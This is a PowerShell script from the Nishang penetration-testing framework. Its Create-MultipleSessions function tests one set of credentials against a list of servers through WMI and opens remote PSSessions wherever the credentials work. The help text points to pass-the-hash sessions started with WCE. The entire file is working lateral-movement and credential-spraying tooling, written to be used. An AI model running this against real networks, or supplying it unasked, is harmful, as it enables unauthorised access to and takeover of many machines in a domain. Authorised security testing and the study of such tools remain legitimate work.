<#
.SYNOPSIS
Nishang script which can check for credentials on remote computers and can open PSSessions if the credentials work.

.DESCRIPTION
The payload uses WMI to check a credential against given list of computers. Use the -Creds parameter to specify username and password. If the script is run
from a powershell session with local or global admin credentials (or from a powershell session started with hashes of such account using WCE), it should be used
without the -Creds parameter. Use the -CreateSessions parameter to create PSSessions. 

.PARAMETER filename
Path to the file which stores list of servers.

.PARAMETER Creds
Use this parameter to specify username (in form of domain\username) and password.

.PARAMETER CreateSessions
Use this parameter to make the script create PSSessions to targets on which the credentials worked.

.PARAMETER VerboseErrors
Use this parameter to get verbose error messages.

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt
Above command uses the credentials available with current powershell session and checks it against multiple computers specified in servers.txt

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt -Creds
Above command asks the user to provide username and passowrd to check on remote computers.

.EXAMPLE
PS > Create-MultipleSessions -filename .\servers.txt -CreateSessions
Above command uses the credentials available with current powershell session, checks it against multiple computers specified in servers.txt and creates PSSession for those.

.LINK
http://labofapenetrationtester.blogspot.com/2013/04/poshing-the-hashes.html
https://github.com/samratashok/nishang
#>



function Create-MultipleSessions
{
    [CmdletBinding()] Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $filename,

        [Parameter(Mandatory = $False)]
        [Switch]
        $Creds,
    
        [Parameter(Mandatory = $False)]
        [Switch]
        $CreateSessions,

        [Parameter(Mandatory = $False)]
        [Switch]
        $VerboseErrors
    )

    $ErrorActionPreference = "SilentlyContinue"
    if ($VerboseErrors)
    {
        $ErrorActionPreference = "Continue"
    }
    $servers = Get-Content $filename

    if ($Creds)
    {
        $Credentials = Get-Credential
        $CheckCommand = 'gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True" -ComputerName $server -Credential $Credentials'
        $SessionCommand = 'New-PSSession -ComputerName $server -Credential $Credentials'
    }

    else
    {
        $CheckCommand = 'gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True" -ComputerName $server'
        $SessionCommand = 'New-PSSession -ComputerName $server'
    }

    foreach ($server in $servers)
    {
       $check = Invoke-Expression $CheckCommand
       if($check -ne $null)
       {
           Write-Host "Credentials worked on $server !!" -ForegroundColor Green
           if ($CreateSessions -eq $True)
           {
                "`nCreating Session for $server"
                Invoke-Expression $SessionCommand
           }
        }
        else
        {
           "Could not connect or credentials didn't work on $server"
        }
    }
    
    if ($CreateSessions -eq $True)
    {
        Write-Host "`nFollowing Sessions have been created: " -ForegroundColor Green
        Get-PSSession
    }
}
